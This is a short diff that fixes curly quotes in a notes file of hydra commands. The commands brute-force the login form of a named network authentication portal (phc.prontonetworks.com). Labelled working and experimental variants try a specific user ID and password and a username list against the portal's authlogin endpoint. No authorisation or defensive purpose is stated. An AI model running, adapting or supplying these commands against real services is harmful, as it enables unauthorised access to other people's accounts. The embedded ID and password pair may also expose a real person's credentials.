@@ -1,11 +1,11 @@
-﻿hydra -l 14BCE0190 -p "9257309" -s 80 -f phc.prontonetworks.com http-post-form “/cgi-bin/authlogin:userId=^USER^&password=^PASS^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
+﻿hydra -l 14BCE0190 -p "9257309" -s 80 -f phc.prontonetworks.com http-post-form "/cgi-bin/authlogin:userId=^USER^&password=^PASS^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
 
 WORKING:
-hydra -L brute.txt -p "lol" -s 80 -f phc.prontonetworks.com http-post-form “/cgi-bin/authlogin:userId=^USER^&password=^USER^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
+hydra -L brute.txt -p "lol" -s 80 -f phc.prontonetworks.com http-post-form "/cgi-bin/authlogin:userId=^USER^&password=^USER^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
 
 
 EXPERIMENT:
-hydra -t 1 -L brute.txt -p "lol" -s 80 -o Found.txt phc.prontonetworks.com http-post-form “/cgi-bin/authlogin:userId=^USER^&password=^USER^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
+hydra -t 1 -L brute.txt -p "lol" -s 80 -o Found.txt phc.prontonetworks.com http-post-form "/cgi-bin/authlogin:userId=^USER^&password=^USER^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
 
 LINUX MULTIPLE
-hydra -L brute.txt -p "lol" -s 80 -t 1 phc.prontonetworks.com http-post-form “/cgi-bin/authlogin:userId=^USER^&password=^USER^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
+hydra -L brute.txt -p "lol" -s 80 -t 1 phc.prontonetworks.com http-post-form "/cgi-bin/authlogin:userId=^USER^&password=^USER^&serviceName=ProntoAuthentication&Submit22=Login:Try Again"
